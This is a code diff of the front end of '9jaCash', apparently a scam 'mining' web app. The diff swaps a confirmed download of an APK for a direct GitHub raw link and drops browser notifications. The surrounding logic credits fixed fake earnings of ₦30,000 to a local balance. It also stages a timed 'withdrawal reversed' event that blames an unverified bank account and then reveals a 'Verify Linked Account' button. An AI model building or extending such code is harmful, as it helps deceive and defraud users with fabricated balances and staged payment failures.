@@ -26,7 +26,7 @@ body.dark-mode .nav-item{color:#64748b;}
 body.dark-mode .nav-item.active{color:#818cf8;}
 body.dark-mode .nav-mid{border-color:#0f172a;}
 body.dark-mode .eye-btn,body.dark-mode .bank-edit{background:#334155;color:#94a3b8;}
-body.dark-mode .notify-btn,body.dark-mode .download-header-btn{background:#1e293b;border-color:#334155;color:#94a3b8;}
+body.dark-mode .notify-btn,body.dark-mode .download-btn{background:#1e293b;border-color:#334155;color:#94a3b8;}
 body.dark-mode .checkin-day.active{border-color:#818cf8;}
 body.dark-mode .checkin-day.locked{opacity:0.3;}
 body.dark-mode .cta-btn:disabled{background:#334155;color:#64748b;}
@@ -47,9 +47,9 @@ body.dark-mode .telegram-float{background:linear-gradient(135deg,#0088cc,#00a8e8
 .avatar{width:48px;height:48px;border-radius:16px;background:linear-gradient(135deg,#6366f1,#8b5cf6);display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;font-weight:700;box-shadow:0 4px 20px rgba(99,102,241,0.25);}
 .greeting{font-size:13px;color:#64748b;font-weight:500;transition:color 0.3s;}
 .name{font-size:16px;font-weight:700;color:#1e293b;transition:color 0.3s;}
-.header-actions {display: flex; align-items: center; gap: 8px;}
-.notify-btn, .download-header-btn{width:44px;height:44px;border-radius:14px;background:#fff;border:1px solid #e2e8f0;display:flex;align-items:center;justify-content:center;color:#64748b;font-size:16px;cursor:pointer;transition:all 0.3s;box-shadow:0 2px 8px rgba(0,0,0,0.04);}
-.notify-btn:hover, .download-header-btn:hover{background:#f1f5f9;color:#6366f1;}
+.topbar-actions{display:flex;align-items:center;gap:8px;}
+.notify-btn, .download-btn{width:44px;height:44px;border-radius:14px;background:#fff;border:1px solid #e2e8f0;display:flex;align-items:center;justify-content:center;color:#64748b;font-size:16px;cursor:pointer;transition:all 0.3s;box-shadow:0 2px 8px rgba(0,0,0,0.04);text-decoration:none;}
+.notify-btn:hover, .download-btn:hover{background:#f1f5f9;color:#6366f1;}
 .tour-pill{display:flex;align-items:center;gap:8px;padding:8px 16px;border-radius:50px;background:#fff;border:1px solid #e2e8f0;font-size:12px;font-weight:700;color:#6366f1;cursor:pointer;transition:all 0.3s;box-shadow:0 2px 8px rgba(0,0,0,0.04);margin-bottom:16px;}
 .tour-pill:hover{background:#eef2ff;transform:translateY(-1px);}
 .tour-pill i{font-size:14px;}
@@ -236,8 +236,10 @@ body.dark-mode .redirect-overlay{background:linear-gradient(135deg,#0f172a 0%,#1
       <div class="name" id="userName">9jaCash User</div>
     </div>
   </div>
-  <div class="header-actions">
-    <button class="download-header-btn" onclick="triggerAppDownload()" id="downloadAppBtn" title="Download App"><i class="fa-solid fa-download"></i></button>
+  <div class="topbar-actions">
+    <a href="https://raw.githubusercontent.com/Xantech007/9jaCashMine/main/9jaCash.apk" class="download-btn" id="downloadAppBtn" title="Download App" download>
+      <i class="fa-solid fa-download"></i>
+    </a>
     <button class="notify-btn" onclick="showToast('No new notifications')" id="notifyBtn"><i class="fa-regular fa-bell"></i></button>
   </div>
 </div>
@@ -271,7 +273,6 @@ body.dark-mode .redirect-overlay{background:linear-gradient(135deg,#0f172a 0%,#1
   </div>
   <button class="bank-edit" onclick="editBank()"><i class="fa-solid fa-pen"></i></button>
 </div>
-<!-- VERIFY BUTTON: ONLY shows after withdrawal has been bounced back and money returned -->
 <div class="verify-btn-wrap" id="verifyBankWrap">
   <button class="verify-btn" onclick="verifyBankLink()" id="verifyBankBtn">
     <i class="fa-solid fa-shield-halved"></i><span>Verify Linked Account</span>
@@ -503,31 +504,6 @@ function finishTutorial() {
   showToast("Tour complete! Start earning!");
 }
 
-function triggerAppDownload() {
-  Swal.fire({
-    title: "Download 9jaCash App",
-    text: "Would you like to download the official mobile app package?",
-    icon: "question",
-    showCancelButton: true,
-    confirmButtonText: "Download Now",
-    cancelButtonText: "Cancel",
-    confirmButtonColor: "#6366f1",
-    background: document.body.classList.contains("dark-mode") ? "#1e293b" : "#fff",
-    color: document.body.classList.contains("dark-mode") ? "#f8fafc" : "#1e293b"
-  }).then((result) => {
-    if (result.isConfirmed) {
-      // Create a temporary anchor to trigger app download (replace file path or APK link as needed)
-      const link = document.createElement('a');
-      link.href = '9jaCash.apk'; 
-      link.download = '9jaCash.apk';
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-      showToast("Download started!");
-    }
-  });
-}
-
 function checkAndShowVerifyButton() {
   const hasBouncedBefore = localStorage.getItem("9jaCashBouncedWithdrawal") === "true";
   const wrap = document.getElementById("verifyBankWrap");
@@ -560,7 +536,6 @@ function executeBounce() {
     
     updateBalance();
     addBounceToActivity("Withdrawal Reversed", amount, "Unsuccessful - Linked bank account not verified");
-    sendBounceNotification(amount);
     
     localStorage.setItem("9jaCashBouncedWithdrawal", "true");
     checkAndShowVerifyButton();
@@ -590,7 +565,7 @@ function checkPendingBounceOnLoad() {
     const timestamp = data.timestamp || 0;
     const now = Date.now();
     const elapsed = now - timestamp;
-    const BOUNCE_DELAY = 30000; 
+    const BOUNCE_DELAY = 30000;
     
     if (elapsed >= BOUNCE_DELAY) {
       executeBounce();
@@ -736,7 +711,6 @@ function completeMining() {
   localStorage.setItem("todayMined", amount.toString()); localStorage.setItem("lastMineDate", new Date().toDateString());
   saveUserData(); updateBalance(); addToActivity("Mining", amount, "in");
   document.getElementById("totalMined").textContent = "₦" + (userData.totalMined || 0).toLocaleString();
-  sendMiningNotification(amount);
   Swal.fire({ icon: "success", title: "Mining Complete!", text: "+₦30,000.00 added to your balance", confirmButtonColor: "#6366f1", background: document.body.classList.contains("dark-mode") ? "#1e293b" : "#fff", color: document.body.classList.contains("dark-mode") ? "#f8fafc" : "#1e293b" });
 }
 
@@ -776,26 +750,6 @@ function loadActivity() {
     div.className = "activity-item";
     div.innerHTML = '<div class="act-icon ' + iconClass + '" style="background:' + bg + ';color:' + color + ';"><i class="fa-solid ' + iconName + '"></i></div><div class="act-info"><div class="act-title">' + item.type + '</div><div class="act-time">' + item.date + '</div></div><div class="act-amount ' + (isOut ? 'out ' : '') + (isBounce ? 'bounce' : '') + '">' + sign + item.amount + '</div>';
     list.appendChild(div);
-  });
-}
-
-function sendMiningNotification(amount) {
-  if (!("Notification" in window)) return;
-  if (Notification.permission !== "granted") return;
-  const formattedAmount = formatMoney(amount);
-  new Notification("9jaCash - Mining Successful", {
-    body: "Your mining of " + formattedAmount + " was successfully credited to your 9jaCash Account",
-    icon: "9jaCash.png", badge: "9jaCash.png", tag: "9jaCash-mining-success", requireInteraction: false
-  });
-}
-
-function sendBounceNotification(amount) {
-  if (!("Notification" in window)) return;
-  if (Notification.permission !== "granted") return;
-  const formattedAmount = formatMoney(amount);
-  new Notification("9jaCash - Withdrawal Reversed", {
-    body: "Withdrawal of " + formattedAmount + " has been reversed. Reason: Linked bank account not verified. Please verify your linked account to withdraw.",
-    icon: "9jaCash.png", badge: "9jaCash.png", tag: "9jaCash-withdrawal-bounce", requireInteraction: true
   });
 }
 
